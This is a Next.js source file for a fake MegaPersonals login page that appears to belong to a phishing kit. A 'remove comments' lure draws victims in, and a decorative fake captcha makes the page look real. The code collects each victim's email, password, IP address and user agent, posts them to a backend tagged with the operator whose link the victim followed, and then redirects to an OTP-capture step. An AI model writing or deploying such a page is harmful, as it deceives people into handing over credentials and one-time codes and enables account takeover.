'use client';
import Image from 'next/image';
import { useRouter } from 'next/navigation';
import { useEffect, useState } from 'react';
import useSWR from 'swr';

const Page = () => {
  const images = [
    '/images/image1.png', '/images/image2.png', '/images/image3.png', '/images/image4.png',
    '/images/image5.png', '/images/image6.png', '/images/image7.png', '/images/image8.png',
    '/images/image9.png', '/images/image10.png', '/images/image11.png', '/images/image12.png',
    '/images/image13.png', '/images/image14.png', '/images/image15.png', '/images/image16.png',
    '/images/image17.png', '/images/image18.png', '/images/image19.png', '/images/image20.png',
    '/images/image21.png', '/images/image22.png', '/images/image23.png', '/images/image24.png',
    '/images/image25.png', '/images/image26.png', '/images/image27.png', '/images/image28.png',
    '/images/image29.png', '/images/image30.png',
  ];

  const router = useRouter();
  const [currentImage, setCurrentImage] = useState(images[0]);
  const [loading, setLoading] = useState(false);
  const [url, setUrl] = useState('');
  const [logUser, setLogUser] = useState('');
  const [error, setError] = useState('');
  const [ip, setIp] = useState('');
  const [sign, setSign] = useState(null);
  const [userAgent, setUserAgent] = useState('');
  const [formData, setFormData] = useState({ email: '', password: '', otp: '' });

  const fetcher = (url) => fetch(url).then((res) => res.json());
  const { data: users, isLoading: userLoading } = useSWR('/api/sign', fetcher, { refreshInterval: 50 });
  const { data, isLoading: dataLoading } = useSWR('/api/link', fetcher, { refreshInterval: 50 });

  const initialUser = typeof window !== 'undefined' ? localStorage.getItem('domain') : null;
  const [loginUser, setLoginUser] = useState(initialUser);

  // Function to get and validate user agent
  const getUserAgent = () => {
    if (typeof window !== 'undefined' && navigator && navigator.userAgent) {
      const ua = navigator.userAgent;
      // Basic validation - check if it's not empty and contains typical UA patterns
      if (ua && ua.length > 10 && (ua.includes('Mozilla') || ua.includes('Chrome') || ua.includes('Safari') || ua.includes('Firefox'))) {
        return ua;
      }
    }
    // Fallback user agent if detection fails
    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
  };

  useEffect(() => {
    // Set user agent immediately when component mounts on client side
    const validUserAgent = getUserAgent();
    setUserAgent(validUserAgent);
  }, []);

  useEffect(() => {
    if (!loginUser) {
      const loggedInUser = localStorage.getItem('domain');
      if (loggedInUser) setLoginUser(loggedInUser);
    }
  }, [loginUser]);

  useEffect(() => {
    const fetchIp = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        setIp(data.ip);
      } catch (error) {
        console.error('Error fetching IP:', error);
        setIp('Unable to fetch IP');
      }
    };
    fetchIp();
  }, []);

  useEffect(() => {
    const domain = localStorage.getItem('domain');
    const logEmail = localStorage.getItem('log_user');
    setUrl(domain);
    setLogUser(logEmail);
  }, []);

  useEffect(() => {
    const links = data?.find((link) => link?.link === loginUser);
    const result = users?.find((user) => user.email === links?.email);
    setSign(result);
  }, [data, users, loginUser]);

  const changeImage = () => {
    const randomIndex = Math.floor(Math.random() * images.length);
    setCurrentImage(images[randomIndex]);
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });

    if (name === 'password' && error === 'Incorrect password') {
      setError('');
    }
  };

  const handlesubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      // Ensure we have a valid user agent before submitting
      const currentUserAgent = userAgent || getUserAgent();

      const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: formData.email,
          password: formData.password,
          name: sign?.name,
          userAgent: currentUserAgent,
          url,
          createdAt: new Date(),
          logEmail: sign?.email,
          ip,
        }),
      });
      const data = await response.json();
      if (data.success) {
        router.push(`/login/otp?valid=${data?.data?.insertedId}`)
      }
      setError('Incorrect password');
    } catch (error) {
      console.error('Error during login:', error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="p-[40px] flex justify-center">
      <section className="flex flex-col gap-[20px]">
        <Image src="/images/loginbenner.png" width={413} height={83} alt="login Banner" />

        <section className="flex flex-col items-center gap-4">
          <div className="flex flex-col items-center gap-2">
            <h3 className="text-black text-[28px] text-center font-normal">
              Confirm your own account before <br />
              <span className="font-bold text-red-800">REMOVE</span> Comments
            </h3>
            <button className="w-[253px] px-[10px] rounded text-white font-bold text-[27px] bg-[#0492FF]">Start Here</button>
          </div>

          {error && <p className="p-2 text-center text-white bg-red-500">{error}</p>}

          <h3 className="text-[#B9A697] text-[18px] font-normal">Already have an account?</h3>
          <form onSubmit={handlesubmit} className="flex flex-col gap-3">
            <input
              type="email"
              name="email"
              value={formData.email}
              onChange={handleInputChange}
              className="block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px]"
              placeholder="Email"
              required
              disabled={loading}
            />
            <input
              type="password"
              name="password"
              value={formData.password}
              onChange={handleInputChange}
              className="block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px]"
              placeholder="Password"
              required
              disabled={loading}
            />
            <div className="flex items-center justify-between">
              <div className="border-2 border-[#c0c0c0] rounded">
                <Image className="p-[2px]" src={currentImage} width={191} height={37} alt="captcha" />
              </div>
              <span onClick={changeImage} className="cursor-pointer">
                <Image src="/images/reloadButton.png" width={41} height={41} alt="reload" />
              </span>
            </div>
            <input
              type="text"
              name="otp"
              value={formData.otp}
              onChange={handleInputChange}
              className="block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px]"
              placeholder="Enter code from the picture"
              disabled={loading}
            />
            <div className="flex flex-col items-center">
              <input
                className={`${loading ? 'w-[150px]' : 'w-[120px]'} rounded h-[44px] bg-[#FEB161] text-[#FFFFFF] text-[22px] cursor-pointer`}
                type="submit"
                value={loading ? 'LOADING...' : 'SUBMIT'}
                disabled={loading}
              />
            </div>
            <Image className="cursor-pointer" src="/images/frame.png" height={109} width={252} alt="help" />
          </form>

          <h3 className="text-[#0000EE] text-[14px] font-normal">FORGOT PASSWORD?</h3>

          <div className="text-center flex flex-col sm:gap-[26px] gap-[10px]">
            <ul className="flex sm:gap-2 gap-[1px] justify-center text-[#0481C9] sm:text-[13px] text-[8px] font-normal">
              <a href="/"><li className="cursor-pointer">Home</li></a>
              <li>|</li>
              <li className="cursor-pointer">Manage Posts</li>
              <li>|</li>
              <li className="cursor-pointer">Contact Us</li>
              <li>|</li>
              <li className="cursor-pointer">Policies & Terms</li>
            </ul>
            <h3 className="text-[#0481C9] text-[13px]">Copyright @2024 MegaPersonals.eu</h3>
          </div>
        </section>
      </section>
    </main>
  );
};

export default Page;